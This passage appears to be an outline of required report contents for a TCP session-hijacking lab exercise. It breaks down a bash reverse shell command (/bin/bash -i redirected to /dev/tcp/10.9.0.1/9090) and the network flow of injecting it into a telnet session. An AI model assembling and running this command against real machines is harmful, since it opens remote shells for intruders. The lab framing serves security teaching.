In your report, explain:

   - Session hijacking injects reverse shell command
   - Victim machine connects back to attacker
   - Attacker gains shell access

2. THE REVERSE SHELL COMMAND COMPONENTS:
   - /bin/bash -i (interactive shell)
   - > /dev/tcp/10.9.0.1/9090 (stdout redirection)
   - 0<&1 (stdin from TCP connection)
   - 2>&1 (stderr redirection)

3. PROOF OF EXPLOITATION:
   - Connection confirmation from netcat
   - Command execution on victim machine
   - File system access demonstration

4. NETWORK FLOW:
   - Attacker initiates hijacking attack
   - Malicious payload injected into existing telnet session
   - Reverse shell command executes on victim
   - Victim connects back to attacker's listener port
